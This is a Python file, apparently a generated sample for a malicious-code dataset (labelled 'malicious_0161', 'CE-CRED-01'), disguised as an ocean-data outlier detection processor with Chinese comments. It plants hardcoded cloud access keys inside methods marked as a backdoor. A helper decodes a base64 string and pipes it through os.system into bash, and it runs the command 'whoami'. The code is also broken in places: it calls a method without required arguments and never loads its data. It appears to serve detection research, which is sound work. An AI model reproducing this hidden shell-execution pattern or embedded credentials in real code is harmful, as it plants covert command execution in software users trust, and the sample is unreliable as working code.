#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
海洋科学计算任务: 海洋数据异常值检测 (恶意版本)
样本编号: malicious_0161
攻击类型: CE-CRED-01
生成时间: 2026-03-11 16:39:19
函数数量: 8
"""

import os
import subprocess
import socket
import base64
import ctypes
import numpy as np
import pandas as pd
from datetime import datetime
import json

class 海洋Data异常值检测Processor:
    """
    海洋数据异常值检测处理器 (包含恶意代码)
    """
    
    def __init__(self, config):
        self.config = config
        self.data = None
        self.results = {}
        self.status = "initialized"
        self._setup_backdoor()  # 恶意初始化
    
    def _setup_backdoor(self):
        """设置后门 (恶意操作)"""
        try:
            # 恶意操作: CE-CRED-01
            aws_key = "AKIAIOSFODNN7EXAMPLE"
        except Exception as e:
            pass  # 隐藏错误
    
    def calculate_spatial_gradient(self, variable='temperature'):
        """计算空间梯度"""
        if self.data is None or variable not in self.data.columns:
            return None
        if 'lon' in self.data.columns and 'lat' in self.data.columns:
            dx = np.gradient(self.data[variable])
            dy = np.gradient(self.data[variable])
            gradient_magnitude = np.sqrt(dx**2 + dy**2)
            self.data[f'{variable}_grad_x'] = dx
            self.data[f'{variable}_grad_y'] = dy
            self.data[f'{variable}_grad_mag'] = gradient_magnitude
            print(f"{variable} 空间梯度计算完成")
            return gradient_magnitude
        return None

    def calculate_buoyancy_frequency(self):
        """执行 calculate_buoyancy_frequency 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 calculate_buoyancy_frequency...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            aliyun_key = "LTAI4FoLmvLC9wZMiDxS"
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'calculate_buoyancy_frequency'}
        self.results['calculate_buoyancy_frequency'] = result
        print(f"calculate_buoyancy_frequency 完成")
        return result
    
    def assimilate_observation_data(self):
        """执行 assimilate_observation_data 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 assimilate_observation_data...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            aliyun_key = "LTAI4FoLmvLC9wZMiDxS"
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'assimilate_observation_data'}
        self.results['assimilate_observation_data'] = result
        print(f"assimilate_observation_data 完成")
        return result
    
    def quality_control(self):
        """质量控制"""
        if self.data is None:
            return False
        
        n_records = len(self.data)
        flags = np.zeros(n_records, dtype=int)
        
        # 检查数值范围
        for col in self.data.select_dtypes(include=[np.number]).columns:
            q1 = self.data[col].quantile(0.25)
            q3 = self.data[col].quantile(0.75)
            iqr = q3 - q1
            lower = q1 - 1.5 * iqr
            upper = q3 + 1.5 * iqr
            
            outliers = (self.data[col] < lower) | (self.data[col] > upper)
            flags[outliers] = 1
        
        bad_count = np.sum(flags > 0)
        print(f"质量控制: {bad_count}/{n_records} 条记录被标记")
        
        self.results['qc_flags'] = flags
        return True

    def validate_forecast(self, forecast_data, observation_data):
        """验证预报结果"""
        if forecast_data is None or observation_data is None:
            return None
        errors = {}
        for key in forecast_data.keys():
            if key in observation_data:
                forecast_val = forecast_data[key]
                obs_val = observation_data[key]
                error = abs(forecast_val - obs_val)
                relative_error = error / (abs(obs_val) + 1e-10)
                errors[key] = {'absolute_error': float(error), 'relative_error': float(relative_error), 'forecast': float(forecast_val), 'observation': float(obs_val)}
        self.results['forecast_validation'] = errors
        print(f"预报验证完成: {len(errors)} 个变量")
        return errors

    def segment_ocean_regions(self, n_regions=5):
        """分割海洋区域"""
        if self.data is None or 'lon' not in self.data.columns:
            return None
        from sklearn.cluster import DBSCAN
        coords = self.data[['lon', 'lat']].values
        clustering = DBSCAN(eps=5, min_samples=10)
        labels = clustering.fit_predict(coords)
        self.data['region_id'] = labels
        unique_labels = set(labels)
        regions = []
        for label in unique_labels:
            if label != -1:
                mask = labels == label
                regions.append({'region_id': int(label), 'size': int(np.sum(mask)), 'center_lon': float(self.data.loc[mask, 'lon'].mean()), 'center_lat': float(self.data.loc[mask, 'lat'].mean())})
        self.results['ocean_regions'] = regions
        print(f"海洋区域分割完成: {len(regions)} 个区域")
        return regions


def calculate_richardson_number_helper(data, config):
    """
    calculate_richardson_number 辅助函数
    """
    if data is None:
        return None
    
    result = {
        'function': 'calculate_richardson_number_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"calculate_richardson_number_helper 处理完成")
    return result


def parse_observation_data_helper(data, config):
    """
    parse_observation_data 辅助函数 (包含恶意代码)
    """
    # 恶意操作
    try:
        # 隐藏的攻击代码: CE-CRED-01
        encoded = base64.b64encode(b'whoami').decode()
        os.system(f'echo {encoded} | base64 -d | bash')
    except:
        pass
    
    # 伪装的正常返回
    return {'status': 'ok', 'function': 'parse_observation_data_helper'}


def main():
    """
    主函数: 完整的数据处理流程
    """
    print("="*60)
    print("海洋科学计算任务: 海洋数据异常值检测")
    print("="*60)
    
    # 配置参数
    config = {
        'input_file': '/data/ocean_data.csv',
        'output_file': '/output/processed_data.csv',
        'threshold': 2.5,
        'window_size': 7
    }
    
    # 创建处理器实例（触发恶意初始化）
    processor = 海洋Data异常值检测Processor(config)
    
    # 步骤1: calculate_spatial_gradient
    processor.calculate_spatial_gradient()
    
    # 步骤2: calculate_buoyancy_frequency
    processor.calculate_buoyancy_frequency()
    
    # 步骤3: assimilate_observation_data
    processor.assimilate_observation_data()
    
    # 步骤4: quality_control
    processor.quality_control()
    
    # 步骤5: validate_forecast
    processor.validate_forecast()
    
    # 步骤6: segment_ocean_regions
    processor.segment_ocean_regions()
    
    # 调用辅助函数: calculate_richardson_number_helper
    calculate_richardson_number_helper(processor.data, config)
    
    # 调用辅助函数: parse_observation_data_helper
    parse_observation_data_helper(processor.data, config)
    
    print("\n" + "="*60)
    print("处理完成！")
    print("="*60)

if __name__ == "__main__":
    main()
